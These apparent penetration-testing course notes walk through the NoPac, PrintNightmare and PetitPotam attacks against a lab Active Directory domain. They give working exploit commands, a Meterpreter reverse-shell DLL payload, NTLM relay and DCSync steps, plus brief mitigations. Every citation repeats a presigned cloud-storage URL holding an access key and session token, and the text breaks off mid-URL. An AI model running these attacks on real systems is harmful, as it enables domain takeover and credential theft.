# Bleeding Edge Vulnerabilities

This section covers three significant AD attack techniques that were relatively recent when originally documented: NoPac (SamAccountName Spoofing), PrintNightmare, and PetitPotam. All three can lead to full domain compromise from limited starting credentials, making them critical to understand during assessments against environments that lag on patching. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt?AWSAccessKeyId=ASIA2F3EMEYE6NTQMQYN&Signature=RXSzUd8dLgohkbTKqkXvB5pqioM%3D&x-amz-security-token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIQCruoN%2BJ1o6Bf06y1vxT22cNgDfgxLa68XhbC9EdE1XswIgBbxRo250%2BO9LUvK%2FL42%2Fo%2B03XPdWwLdNKPxR9dDQymAq%2FAQIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARABGgw2OTk3NTMzMDk3MDUiDFdD32M4KV3%2Bl%2F7FyyrQBDBjf%2Ftq7F1HTRps5%2FkAdUToHhTlPQm2%2BprHzUJwHeF1ynK%2BZPPka1jCJ3Bt2dTkYW49jktvr6c7CPfBCGX0GfY3yG22hkO9KPXBCzCSlMJuc2e5eskfq15ACFPmSFCA%2BTvglQmVVZ8NUaTtV2gzRk0J1wcFpOppod5qoa8KcjRtY9hm6NXLBYOYbDdf7ojWuZshm%2FIVa8YvbDIKXmowglQ2lmzqOIS%2BJV0mGzaFPnHH4zw33te%2BFJDVaJED9fHQVIUZbp0hp3N2LoidOelVpxolAZnIAkA2aKb5GkpKQtylyh%2BXPPqT6UdezrK9ADKC38htSkqMvWKbrgXFB8ngkgbSBxPT3ybK6qAKg%2Fhpo8BwEclMWRPyVKzrBEhdA3U6HUJ0L%2BaQHQB9mzSTcs9WLR4%2BE22Nv7gYLq3kB%2BSjrBEoUBPJINUfq9tCB38eN1QZmJ0VNuKPQGdVmwgCRnfHMbhI21BISR4ji2LaRoWklqGHZQgq2nvcobdhXdwP%2FjMRRcj7eo5z3RTmDIUvYt2AmwIHlSIOWSuKScCfsze7UZ8gZt4RcWONkRiAMUthDD7dvP73ntelFFVQd6oDjB%2BJLenXQ4EErBAQhZijWsYrBVI3CTMTMd8k9swBqi06huny1Ie4kxkT64kQFoYLJjvQm1qQUOM2KwbMWdYk0wVmzIc56u64pIT7We5Z5K7tLUZ%2Bn8zYAuU2FiczHsyEGqF05nEvbkHC54qxSye5b%2BRof0PUXeq4QrbEU7uG6nIoektMQvDAqKmdB1rlVIMLHqWK9GAwj4%2BMzgY6mAEn%2FvPjzS7D8nBIBnul1rmSiPqmOBe05mkugnEj5qgpJzz1%2BtGSnYX92J0ogMr91PUY3Ze9eOIObHfckbkl78b4JuKztX9lAXHX%2Fmd2yIw7PggNSfqjkxoX7%2B%2BQt3LXDXrMmgMqICNVueCG3rwV40RLLCRWTB2Uyz9%2BpNj1gxhdwPDKH5i7wv7vg9sgyXmf3cQmZ%2FDiGTTMKA%3D%3D&Expires=1774390896)

***

## NoPac (CVE-2021-42278 / CVE-2021-42287)

NoPac, also known as Sam_The_Admin or SamAccountName Spoofing, chains two CVEs to escalate from any standard domain user to Domain Admin in a single command. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt?AWSAccessKeyId=ASIA2F3EMEYE6NTQMQYN&Signature=RXSzUd8dLgohkbTKqkXvB5pqioM%3D&x-amz-security-token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIQCruoN%2BJ1o6Bf06y1vxT22cNgDfgxLa68XhbC9EdE1XswIgBbxRo250%2BO9LUvK%2FL42%2Fo%2B03XPdWwLdNKPxR9dDQymAq%2FAQIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARABGgw2OTk3NTMzMDk3MDUiDFdD32M4KV3%2Bl%2F7FyyrQBDBjf%2Ftq7F1HTRps5%2FkAdUToHhTlPQm2%2BprHzUJwHeF1ynK%2BZPPka1jCJ3Bt2dTkYW49jktvr6c7CPfBCGX0GfY3yG22hkO9KPXBCzCSlMJuc2e5eskfq15ACFPmSFCA%2BTvglQmVVZ8NUaTtV2gzRk0J1wcFpOppod5qoa8KcjRtY9hm6NXLBYOYbDdf7ojWuZshm%2FIVa8YvbDIKXmowglQ2lmzqOIS%2BJV0mGzaFPnHH4zw33te%2BFJDVaJED9fHQVIUZbp0hp3N2LoidOelVpxolAZnIAkA2aKb5GkpKQtylyh%2BXPPqT6UdezrK9ADKC38htSkqMvWKbrgXFB8ngkgbSBxPT3ybK6qAKg%2Fhpo8BwEclMWRPyVKzrBEhdA3U6HUJ0L%2BaQHQB9mzSTcs9WLR4%2BE22Nv7gYLq3kB%2BSjrBEoUBPJINUfq9tCB38eN1QZmJ0VNuKPQGdVmwgCRnfHMbhI21BISR4ji2LaRoWklqGHZQgq2nvcobdhXdwP%2FjMRRcj7eo5z3RTmDIUvYt2AmwIHlSIOWSuKScCfsze7UZ8gZt4RcWONkRiAMUthDD7dvP73ntelFFVQd6oDjB%2BJLenXQ4EErBAQhZijWsYrBVI3CTMTMd8k9swBqi06huny1Ie4kxkT64kQFoYLJjvQm1qQUOM2KwbMWdYk0wVmzIc56u64pIT7We5Z5K7tLUZ%2Bn8zYAuU2FiczHsyEGqF05nEvbkHC54qxSye5b%2BRof0PUXeq4QrbEU7uG6nIoektMQvDAqKmdB1rlVIMLHqWK9GAwj4%2BMzgY6mAEn%2FvPjzS7D8nBIBnul1rmSiPqmOBe05mkugnEj5qgpJzz1%2BtGSnYX92J0ogMr91PUY3Ze9eOIObHfckbkl78b4JuKztX9lAXHX%2Fmd2yIw7PggNSfqjkxoX7%2B%2BQt3LXDXrMmgMqICNVueCG3rwV40RLLCRWTB2Uyz9%2BpNj1gxhdwPDKH5i7wv7vg9sgyXmf3cQmZ%2FDiGTTMKA%3D%3D&Expires=1774390896)

| CVE | What it Abuses |
|-----|----------------|
| 2021-42278 | Bypass in the Security Account Manager (SAM) allowing renaming of computer accounts |
| 2021-42287 | Vulnerability in Kerberos PAC within AD DS |

The attack works by creating a new computer account (authenticated users can add up to 10 by default via `ms-DS-MachineAccountQuota`), renaming it to match a Domain Controller's `SamAccountName`, requesting a TGT under that DC name, then restoring the original name. When a TGS is later requested, Kerberos issues the ticket under the DC's identity, granting access as that DC. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt?AWSAccessKeyId=ASIA2F3EMEYE6NTQMQYN&Signature=RXSzUd8dLgohkbTKqkXvB5pqioM%3D&x-amz-security-token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIQCruoN%2BJ1o6Bf06y1vxT22cNgDfgxLa68XhbC9EdE1XswIgBbxRo250%2BO9LUvK%2FL42%2Fo%2B03XPdWwLdNKPxR9dDQymAq%2FAQIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARABGgw2OTk3NTMzMDk3MDUiDFdD32M4KV3%2Bl%2F7FyyrQBDBjf%2Ftq7F1HTRps5%2FkAdUToHhTlPQm2%2BprHzUJwHeF1ynK%2BZPPka1jCJ3Bt2dTkYW49jktvr6c7CPfBCGX0GfY3yG22hkO9KPXBCzCSlMJuc2e5eskfq15ACFPmSFCA%2BTvglQmVVZ8NUaTtV2gzRk0J1wcFpOppod5qoa8KcjRtY9hm6NXLBYOYbDdf7ojWuZshm%2FIVa8YvbDIKXmowglQ2lmzqOIS%2BJV0mGzaFPnHH4zw33te%2BFJDVaJED9fHQVIUZbp0hp3N2LoidOelVpxolAZnIAkA2aKb5GkpKQtylyh%2BXPPqT6UdezrK9ADKC38htSkqMvWKbrgXFB8ngkgbSBxPT3ybK6qAKg%2Fhpo8BwEclMWRPyVKzrBEhdA3U6HUJ0L%2BaQHQB9mzSTcs9WLR4%2BE22Nv7gYLq3kB%2BSjrBEoUBPJINUfq9tCB38eN1QZmJ0VNuKPQGdVmwgCRnfHMbhI21BISR4ji2LaRoWklqGHZQgq2nvcobdhXdwP%2FjMRRcj7eo5z3RTmDIUvYt2AmwIHlSIOWSuKScCfsze7UZ8gZt4RcWONkRiAMUthDD7dvP73ntelFFVQd6oDjB%2BJLenXQ4EErBAQhZijWsYrBVI3CTMTMd8k9swBqi06huny1Ie4kxkT64kQFoYLJjvQm1qQUOM2KwbMWdYk0wVmzIc56u64pIT7We5Z5K7tLUZ%2Bn8zYAuU2FiczHsyEGqF05nEvbkHC54qxSye5b%2BRof0PUXeq4QrbEU7uG6nIoektMQvDAqKmdB1rlVIMLHqWK9GAwj4%2BMzgY6mAEn%2FvPjzS7D8nBIBnul1rmSiPqmOBe05mkugnEj5qgpJzz1%2BtGSnYX92J0ogMr91PUY3Ze9eOIObHfckbkl78b4JuKztX9lAXHX%2Fmd2yIw7PggNSfqjkxoX7%2B%2BQt3LXDXrMmgMqICNVueCG3rwV40RLLCRWTB2Uyz9%2BpNj1gxhdwPDKH5i7wv7vg9sgyXmf3cQmZ%2FDiGTTMKA%3D%3D&Expires=1774390896)

### Scanning and Exploiting

First confirm vulnerability:

```bash
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

Output confirms `ms-DS-MachineAccountQuota = 10` and a successful TGT retrieval. If the quota is set to 0, the attack fails entirely.

Get a SYSTEM shell on the DC:

```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

This drops you into a semi-interactive smbexec shell at `C:\Windows\system32>`. Since smbexec is used, you must use full paths rather than navigating with `cd`.

Alternatively, run it with `-dump` to go straight to DCSync:

```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

The tool saves `.ccache` ticket files to disk that can be used for pass-the-ticket attacks. Be aware that Windows Defender will flag smbexec activity through its `BTOBTO`/`BTOBO` service creation pattern and quarantine the batch files used for command execution. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt?AWSAccessKeyId=ASIA2F3EMEYE6NTQMQYN&Signature=RXSzUd8dLgohkbTKqkXvB5pqioM%3D&x-amz-security-token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIQCruoN%2BJ1o6Bf06y1vxT22cNgDfgxLa68XhbC9EdE1XswIgBbxRo250%2BO9LUvK%2FL42%2Fo%2B03XPdWwLdNKPxR9dDQymAq%2FAQIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARABGgw2OTk3NTMzMDk3MDUiDFdD32M4KV3%2Bl%2F7FyyrQBDBjf%2Ftq7F1HTRps5%2FkAdUToHhTlPQm2%2BprHzUJwHeF1ynK%2BZPPka1jCJ3Bt2dTkYW49jktvr6c7CPfBCGX0GfY3yG22hkO9KPXBCzCSlMJuc2e5eskfq15ACFPmSFCA%2BTvglQmVVZ8NUaTtV2gzRk0J1wcFpOppod5qoa8KcjRtY9hm6NXLBYOYbDdf7ojWuZshm%2FIVa8YvbDIKXmowglQ2lmzqOIS%2BJV0mGzaFPnHH4zw33te%2BFJDVaJED9fHQVIUZbp0hp3N2LoidOelVpxolAZnIAkA2aKb5GkpKQtylyh%2BXPPqT6UdezrK9ADKC38htSkqMvWKbrgXFB8ngkgbSBxPT3ybK6qAKg%2Fhpo8BwEclMWRPyVKzrBEhdA3U6HUJ0L%2BaQHQB9mzSTcs9WLR4%2BE22Nv7gYLq3kB%2BSjrBEoUBPJINUfq9tCB38eN1QZmJ0VNuKPQGdVmwgCRnfHMbhI21BISR4ji2LaRoWklqGHZQgq2nvcobdhXdwP%2FjMRRcj7eo5z3RTmDIUvYt2AmwIHlSIOWSuKScCfsze7UZ8gZt4RcWONkRiAMUthDD7dvP73ntelFFVQd6oDjB%2BJLenXQ4EErBAQhZijWsYrBVI3CTMTMd8k9swBqi06huny1Ie4kxkT64kQFoYLJjvQm1qQUOM2KwbMWdYk0wVmzIc56u64pIT7We5Z5K7tLUZ%2Bn8zYAuU2FiczHsyEGqF05nEvbkHC54qxSye5b%2BRof0PUXeq4QrbEU7uG6nIoektMQvDAqKmdB1rlVIMLHqWK9GAwj4%2BMzgY6mAEn%2FvPjzS7D8nBIBnul1rmSiPqmOBe05mkugnEj5qgpJzz1%2BtGSnYX92J0ogMr91PUY3Ze9eOIObHfckbkl78b4JuKztX9lAXHX%2Fmd2yIw7PggNSfqjkxoX7%2B%2BQt3LXDXrMmgMqICNVueCG3rwV40RLLCRWTB2Uyz9%2BpNj1gxhdwPDKH5i7wv7vg9sgyXmf3cQmZ%2FDiGTTMKA%3D%3D&Expires=1774390896)

***

## PrintNightmare (CVE-2021-34527 / CVE-2021-1675)

PrintNightmare targets the Print Spooler service running on all Windows systems. It allows for remote code execution and privilege escalation. The attack abuses the spooler's ability to load a DLL from a remote share. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt?AWSAccessKeyId=ASIA2F3EMEYE6NTQMQYN&Signature=RXSzUd8dLgohkbTKqkXvB5pqioM%3D&x-amz-security-token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIQCruoN%2BJ1o6Bf06y1vxT22cNgDfgxLa68XhbC9EdE1XswIgBbxRo250%2BO9LUvK%2FL42%2Fo%2B03XPdWwLdNKPxR9dDQymAq%2FAQIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARABGgw2OTk3NTMzMDk3MDUiDFdD32M4KV3%2Bl%2F7FyyrQBDBjf%2Ftq7F1HTRps5%2FkAdUToHhTlPQm2%2BprHzUJwHeF1ynK%2BZPPka1jCJ3Bt2dTkYW49jktvr6c7CPfBCGX0GfY3yG22hkO9KPXBCzCSlMJuc2e5eskfq15ACFPmSFCA%2BTvglQmVVZ8NUaTtV2gzRk0J1wcFpOppod5qoa8KcjRtY9hm6NXLBYOYbDdf7ojWuZshm%2FIVa8YvbDIKXmowglQ2lmzqOIS%2BJV0mGzaFPnHH4zw33te%2BFJDVaJED9fHQVIUZbp0hp3N2LoidOelVpxolAZnIAkA2aKb5GkpKQtylyh%2BXPPqT6UdezrK9ADKC38htSkqMvWKbrgXFB8ngkgbSBxPT3ybK6qAKg%2Fhpo8BwEclMWRPyVKzrBEhdA3U6HUJ0L%2BaQHQB9mzSTcs9WLR4%2BE22Nv7gYLq3kB%2BSjrBEoUBPJINUfq9tCB38eN1QZmJ0VNuKPQGdVmwgCRnfHMbhI21BISR4ji2LaRoWklqGHZQgq2nvcobdhXdwP%2FjMRRcj7eo5z3RTmDIUvYt2AmwIHlSIOWSuKScCfsze7UZ8gZt4RcWONkRiAMUthDD7dvP73ntelFFVQd6oDjB%2BJLenXQ4EErBAQhZijWsYrBVI3CTMTMd8k9swBqi06huny1Ie4kxkT64kQFoYLJjvQm1qQUOM2KwbMWdYk0wVmzIc56u64pIT7We5Z5K7tLUZ%2Bn8zYAuU2FiczHsyEGqF05nEvbkHC54qxSye5b%2BRof0PUXeq4QrbEU7uG6nIoektMQvDAqKmdB1rlVIMLHqWK9GAwj4%2BMzgY6mAEn%2FvPjzS7D8nBIBnul1rmSiPqmOBe05mkugnEj5qgpJzz1%2BtGSnYX92J0ogMr91PUY3Ze9eOIObHfckbkl78b4JuKztX9lAXHX%2Fmd2yIw7PggNSfqjkxoX7%2B%2BQt3LXDXrMmgMqICNVueCG3rwV40RLLCRWTB2Uyz9%2BpNj1gxhdwPDKH5i7wv7vg9sgyXmf3cQmZ%2FDiGTTMKA%3D%3D&Expires=1774390896)

### Attack Steps

Confirm the target exposes the required RPC protocols:

```bash
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

Expected output:

```
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
```

Generate a malicious DLL payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

Host the DLL via a temporary SMB share:

```bash
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

Start an MSF multi/handler listener, then run the exploit:

```bash
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

A Meterpreter session opens and dropping to shell confirms `NT AUTHORITY\SYSTEM` on the Domain Controller. Notably, this attack can crash the Print Spooler service on the target, which must be communicated to the client before attempting during an engagement. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt?AWSAccessKeyId=ASIA2F3EMEYE6NTQMQYN&Signature=RXSzUd8dLgohkbTKqkXvB5pqioM%3D&x-amz-security-token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIQCruoN%2BJ1o6Bf06y1vxT22cNgDfgxLa68XhbC9EdE1XswIgBbxRo250%2BO9LUvK%2FL42%2Fo%2B03XPdWwLdNKPxR9dDQymAq%2FAQIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARABGgw2OTk3NTMzMDk3MDUiDFdD32M4KV3%2Bl%2F7FyyrQBDBjf%2Ftq7F1HTRps5%2FkAdUToHhTlPQm2%2BprHzUJwHeF1ynK%2BZPPka1jCJ3Bt2dTkYW49jktvr6c7CPfBCGX0GfY3yG22hkO9KPXBCzCSlMJuc2e5eskfq15ACFPmSFCA%2BTvglQmVVZ8NUaTtV2gzRk0J1wcFpOppod5qoa8KcjRtY9hm6NXLBYOYbDdf7ojWuZshm%2FIVa8YvbDIKXmowglQ2lmzqOIS%2BJV0mGzaFPnHH4zw33te%2BFJDVaJED9fHQVIUZbp0hp3N2LoidOelVpxolAZnIAkA2aKb5GkpKQtylyh%2BXPPqT6UdezrK9ADKC38htSkqMvWKbrgXFB8ngkgbSBxPT3ybK6qAKg%2Fhpo8BwEclMWRPyVKzrBEhdA3U6HUJ0L%2BaQHQB9mzSTcs9WLR4%2BE22Nv7gYLq3kB%2BSjrBEoUBPJINUfq9tCB38eN1QZmJ0VNuKPQGdVmwgCRnfHMbhI21BISR4ji2LaRoWklqGHZQgq2nvcobdhXdwP%2FjMRRcj7eo5z3RTmDIUvYt2AmwIHlSIOWSuKScCfsze7UZ8gZt4RcWONkRiAMUthDD7dvP73ntelFFVQd6oDjB%2BJLenXQ4EErBAQhZijWsYrBVI3CTMTMd8k9swBqi06huny1Ie4kxkT64kQFoYLJjvQm1qQUOM2KwbMWdYk0wVmzIc56u64pIT7We5Z5K7tLUZ%2Bn8zYAuU2FiczHsyEGqF05nEvbkHC54qxSye5b%2BRof0PUXeq4QrbEU7uG6nIoektMQvDAqKmdB1rlVIMLHqWK9GAwj4%2BMzgY6mAEn%2FvPjzS7D8nBIBnul1rmSiPqmOBe05mkugnEj5qgpJzz1%2BtGSnYX92J0ogMr91PUY3Ze9eOIObHfckbkl78b4JuKztX9lAXHX%2Fmd2yIw7PggNSfqjkxoX7%2B%2BQt3LXDXrMmgMqICNVueCG3rwV40RLLCRWTB2Uyz9%2BpNj1gxhdwPDKH5i7wv7vg9sgyXmf3cQmZ%2FDiGTTMKA%3D%3D&Expires=1774390896)

***

## PetitPotam (CVE-2021-36942)

PetitPotam is an LSA spoofing vulnerability that coerces a Domain Controller into authenticating to an attacker-controlled host over NTLM via the MS-EFSRPC protocol. When AD Certificate Services (AD CS) is present in the environment, this NTLM authentication can be relayed to the CA's web enrollment page to obtain a certificate for the DC, which can then be used to request a TGT and perform a full DCSync. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt?AWSAccessKeyId=ASIA2F3EMEYE6NTQMQYN&Signature=RXSzUd8dLgohkbTKqkXvB5pqioM%3D&x-amz-security-token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIQCruoN%2BJ1o6Bf06y1vxT22cNgDfgxLa68XhbC9EdE1XswIgBbxRo250%2BO9LUvK%2FL42%2Fo%2B03XPdWwLdNKPxR9dDQymAq%2FAQIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARABGgw2OTk3NTMzMDk3MDUiDFdD32M4KV3%2Bl%2F7FyyrQBDBjf%2Ftq7F1HTRps5%2FkAdUToHhTlPQm2%2BprHzUJwHeF1ynK%2BZPPka1jCJ3Bt2dTkYW49jktvr6c7CPfBCGX0GfY3yG22hkO9KPXBCzCSlMJuc2e5eskfq15ACFPmSFCA%2BTvglQmVVZ8NUaTtV2gzRk0J1wcFpOppod5qoa8KcjRtY9hm6NXLBYOYbDdf7ojWuZshm%2FIVa8YvbDIKXmowglQ2lmzqOIS%2BJV0mGzaFPnHH4zw33te%2BFJDVaJED9fHQVIUZbp0hp3N2LoidOelVpxolAZnIAkA2aKb5GkpKQtylyh%2BXPPqT6UdezrK9ADKC38htSkqMvWKbrgXFB8ngkgbSBxPT3ybK6qAKg%2Fhpo8BwEclMWRPyVKzrBEhdA3U6HUJ0L%2BaQHQB9mzSTcs9WLR4%2BE22Nv7gYLq3kB%2BSjrBEoUBPJINUfq9tCB38eN1QZmJ0VNuKPQGdVmwgCRnfHMbhI21BISR4ji2LaRoWklqGHZQgq2nvcobdhXdwP%2FjMRRcj7eo5z3RTmDIUvYt2AmwIHlSIOWSuKScCfsze7UZ8gZt4RcWONkRiAMUthDD7dvP73ntelFFVQd6oDjB%2BJLenXQ4EErBAQhZijWsYrBVI3CTMTMd8k9swBqi06huny1Ie4kxkT64kQFoYLJjvQm1qQUOM2KwbMWdYk0wVmzIc56u64pIT7We5Z5K7tLUZ%2Bn8zYAuU2FiczHsyEGqF05nEvbkHC54qxSye5b%2BRof0PUXeq4QrbEU7uG6nIoektMQvDAqKmdB1rlVIMLHqWK9GAwj4%2BMzgY6mAEn%2FvPjzS7D8nBIBnul1rmSiPqmOBe05mkugnEj5qgpJzz1%2BtGSnYX92J0ogMr91PUY3Ze9eOIObHfckbkl78b4JuKztX9lAXHX%2Fmd2yIw7PggNSfqjkxoX7%2B%2BQt3LXDXrMmgMqICNVueCG3rwV40RLLCRWTB2Uyz9%2BpNj1gxhdwPDKH5i7wv7vg9sgyXmf3cQmZ%2FDiGTTMKA%3D%3D&Expires=1774390896)

### Attack Chain

The full attack requires two terminal windows running simultaneously.

**Window 1:** Start ntlmrelayx.py targeting the CA's web enrollment endpoint:

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

**Window 2:** Trigger the DC to authenticate to your host using PetitPotam:

```bash
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```

If successful, ntlmrelayx catches the DC's authentication and returns a base64-encoded certificate. From here, request a TGT using that certificate:

```bash
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAz...SNIP...= dc01.ccache
export KRB5CCNAME=dc01.ccache
```

Then DCSync using the cached ticket:

```bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

An alternate route is to use [getnthash.py](https://github.com/dirkjanm/PKINITtools) from PKINITtools to extract the DC's NT hash directly using Kerberos U2U and the AS-REP encryption key returned during TGT retrieval, then pass that hash to secretsdump:

```bash
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```

From a Windows attack host, the base64 certificate can be used directly with Rubeus for a combined TGT request and pass-the-ticket, after which Mimikatz DCSync with `lsadump::dcsync` retrieves the `krbtgt` hash for Golden Ticket creation. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt?AWSAccessKeyId=ASIA2F3EMEYE6NTQMQYN&Signature=RXSzUd8dLgohkbTKqkXvB5pqioM%3D&x-amz-security-token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIQCruoN%2BJ1o6Bf06y1vxT22cNgDfgxLa68XhbC9EdE1XswIgBbxRo250%2BO9LUvK%2FL42%2Fo%2B03XPdWwLdNKPxR9dDQymAq%2FAQIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARABGgw2OTk3NTMzMDk3MDUiDFdD32M4KV3%2Bl%2F7FyyrQBDBjf%2Ftq7F1HTRps5%2FkAdUToHhTlPQm2%2BprHzUJwHeF1ynK%2BZPPka1jCJ3Bt2dTkYW49jktvr6c7CPfBCGX0GfY3yG22hkO9KPXBCzCSlMJuc2e5eskfq15ACFPmSFCA%2BTvglQmVVZ8NUaTtV2gzRk0J1wcFpOppod5qoa8KcjRtY9hm6NXLBYOYbDdf7ojWuZshm%2FIVa8YvbDIKXmowglQ2lmzqOIS%2BJV0mGzaFPnHH4zw33te%2BFJDVaJED9fHQVIUZbp0hp3N2LoidOelVpxolAZnIAkA2aKb5GkpKQtylyh%2BXPPqT6UdezrK9ADKC38htSkqMvWKbrgXFB8ngkgbSBxPT3ybK6qAKg%2Fhpo8BwEclMWRPyVKzrBEhdA3U6HUJ0L%2BaQHQB9mzSTcs9WLR4%2BE22Nv7gYLq3kB%2BSjrBEoUBPJINUfq9tCB38eN1QZmJ0VNuKPQGdVmwgCRnfHMbhI21BISR4ji2LaRoWklqGHZQgq2nvcobdhXdwP%2FjMRRcj7eo5z3RTmDIUvYt2AmwIHlSIOWSuKScCfsze7UZ8gZt4RcWONkRiAMUthDD7dvP73ntelFFVQd6oDjB%2BJLenXQ4EErBAQhZijWsYrBVI3CTMTMd8k9swBqi06huny1Ie4kxkT64kQFoYLJjvQm1qQUOM2KwbMWdYk0wVmzIc56u64pIT7We5Z5K7tLUZ%2Bn8zYAuU2FiczHsyEGqF05nEvbkHC54qxSye5b%2BRof0PUXeq4QrbEU7uG6nIoektMQvDAqKmdB1rlVIMLHqWK9GAwj4%2BMzgY6mAEn%2FvPjzS7D8nBIBnul1rmSiPqmOBe05mkugnEj5qgpJzz1%2BtGSnYX92J0ogMr91PUY3Ze9eOIObHfckbkl78b4JuKztX9lAXHX%2Fmd2yIw7PggNSfqjkxoX7%2B%2BQt3LXDXrMmgMqICNVueCG3rwV40RLLCRWTB2Uyz9%2BpNj1gxhdwPDKH5i7wv7vg9sgyXmf3cQmZ%2FDiGTTMKA%3D%3D&Expires=1774390896)

### PetitPotam Mitigations

- Apply the CVE-2021-36942 patch to affected hosts
- Enable Extended Protection for Authentication on AD CS web services
- Require SSL on Certificate Authority Web Enrollment and Certificate Enrollment Web Service
- Disable NTLM authentication on Domain Controllers and AD CS servers via Group Policy
- Review the [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) whitepaper for deeper AD CS hardening, since the CVE patch alone does not cover all attack paths against AD CS [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt?AWSAccessKeyId=ASIA2F3EMEYE6NTQMQYN&Signature=RXSzUd8dLgohkbTKqkXvB5pqioM%3D&x-amz-security-token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIQCruoN%2BJ1o6Bf06y1vxT22cNgDfgxLa68XhbC9EdE1XswIgBbxRo250%2BO9LUvK%2FL42%2Fo%2B03XPdWwLdNKPxR9dDQymAq%2FAQIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARABGgw2OTk3NTMzMDk3MDUiDFdD32M4KV3%2Bl%2F7FyyrQBDBjf%2Ftq7F1HTRps5%2FkAdUToHhTlPQm2%2BprHzUJwHeF1ynK%2BZPPka1jCJ3Bt2dTkYW49jktvr6c7CPfBCGX0GfY3yG22hkO9KPXBCzCSlMJuc2e5eskfq15ACFPmSFCA%2BTvglQmVVZ8NUaTtV2gzRk0J1wcFpOppod5qoa8KcjRtY9hm6NXLBYOYbDdf7ojWuZshm%2FIVa8YvbDIKXmowglQ2lmzqOIS%2BJV0mGzaFPnHH4zw33te%2BF